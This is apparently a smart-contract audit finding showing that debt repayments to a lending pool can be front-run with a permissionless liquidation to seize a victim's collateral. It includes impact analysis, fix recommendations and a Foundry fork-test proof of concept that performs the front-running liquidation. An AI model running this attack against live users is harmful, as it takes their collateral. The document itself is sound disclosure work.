### Title
Pending debt repayment can be front-run to force a liquidation - ([File: contracts/Pool.sol])

### Summary
`DebtToken.repay()` and `DebtToken.repayAll()` publicly expose the debtor being protected. If the position is currently liquidatable, an unprivileged attacker can observe the pending repayment and first call `Pool.liquidate()`, causing the victim to lose collateral and the liquidation incentive instead of allowing the repayment to restore the position.

### Finding Description
`DebtToken.repay(onBehalfOf_, amount_)` accepts the target account and amount as calldata and burns synthetic tokens from the payer before reducing `onBehalfOf_`’s debt. `repayAll(onBehalfOf_)` similarly exposes the account whose complete debt is about to be repaid. [1](#0-0) [2](#0-1) 

`Pool.liquidate()` is permissionless. It requires only that the selected synthetic and deposit tokens are registered and that `debtPositionOf(account_)` reports the account as unhealthy at execution time. The caller can repay up to `maxLiquidable` of the account’s debt and seize collateral plus the configured liquidator incentive. [3](#0-2) [4](#0-3) 

Therefore, a pending `repay()` or `repayAll()` transaction is effectively a public rescue signal. It supplies the debt-token contract, target account, and—except for `repayAll()`—the intended repayment amount. An attacker can insert a liquidation transaction before it while the old unhealthy state still applies.

### Impact Explanation
The victim loses collateral equal to the attacker’s repayment value plus the liquidator incentive, and may also lose the protocol liquidation fee portion. This converts a transaction intended to restore solvency into an attacker-controlled collateral seizure. The loss is bounded by `maxLiquidable`, the victim’s debt, and the victim’s available deposit-token balance. [5](#0-4) 

### Likelihood Explanation
No privileged role, oracle manipulation, or malformed contract state is required. The attacker only needs to monitor public mempool transactions, hold or acquire sufficient synthetic tokens, and submit `liquidate()` with a higher priority fee. The existing checks do not prevent the ordering because liquidation is intentionally permissionless and the account is still unhealthy before the pending repayment executes. [6](#0-5) 

The attack is most attractive when the pending repayment would otherwise make the position healthy, because the liquidation becomes unavailable immediately afterward.

### Recommendation
Provide a protected repayment path that does not expose the target position before execution, such as an atomic repay-and-healthcheck helper accessed through private transaction submission. Alternatively, allow an account or authorized operator to use a commit/reveal or otherwise commit to repayment without revealing `onBehalfOf_` in advance.

At the application level, users should submit rescue transactions through a private mempool or bundle that prevents adversarial insertion before repayment. A protocol-level fix would need a liquidation grace period or an atomic repayment mechanism; simply reducing calldata would not be sufficient because `repayAll(onBehalfOf_)` still exposes the account.

### Proof of Concept
The following Foundry fork test demonstrates the ordering. A victim begins with an unhealthy position, broadcasts a repayment, and the attacker front-runs it with `Pool.liquidate()`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IDebtToken} from "contracts/interfaces/IDebtToken.sol";
import {IDepositToken} from "contracts/interfaces/IDepositToken.sol";
import {IPool} from "contracts/interfaces/IPool.sol";
import {ISyntheticToken} from "contracts/interfaces/ISyntheticToken.sol";

contract RepayFrontRunningTest is Test {
    IPool pool = IPool(vm.envAddress("POOL"));
    IDebtToken debtToken = IDebtToken(vm.envAddress("DEBT_TOKEN"));
    IDepositToken depositToken = IDepositToken(vm.envAddress("DEPOSIT_TOKEN"));
    ISyntheticToken syntheticToken = ISyntheticToken(debtToken.syntheticToken());

    address victim = vm.envAddress("UNHEALTHY_VICTIM");
    address payer = vm.envAddress("REPAY_PAYER");
    address attacker = makeAddr("liquidator");

    function test_repayCanBeFrontRunWithLiquidation() public {
        (bool healthyBefore,,,,) = pool.debtPositionOf(victim);
        assertFalse(healthyBefore);

        uint256 victimCollateralBefore = depositToken.balanceOf(victim);
        uint256 debtBefore = debtToken.balanceOf(victim);

        uint256 repayAmount = debtBefore / 2;
        (uint256 seizedQuote,,) = pool.quoteLiquidateOut(
            syntheticToken,
            repayAmount,
            depositToken
        );
        require(seizedQuote <= victimCollateralBefore, "insufficient collateral");

        // Give the unprivileged liquidator enough synthetic tokens to repay.
        deal(address(syntheticToken), attacker, repayAmount);

        uint256 attackerCollateralBefore = depositToken.balanceOf(attacker);

        // The observed transaction is:
        // debtToken.repay(victim, repayAmount)
        // or debtToken.repayAll(victim).
        // The attacker extracts `victim` and the token addresses from calldata,
        // then executes this transaction first.
        vm.prank(attacker);
        pool.liquidate(syntheticToken, victim, repayAmount, depositToken);

        assertGt(
            depositToken.balanceOf(attacker),
            attackerCollateralBefore,
            "liquidator did not seize collateral"
        );
        assertLt(
            depositToken.balanceOf(victim),
            victimCollateralBefore,
            "victim collateral was not seized"
        );

        // The pending repayment now operates on a state in which the attacker
        // already captured the liquidation incentive.
        vm.prank(payer);
        debtToken.repay(victim, debtToken.balanceOf(victim));
    }
}
```
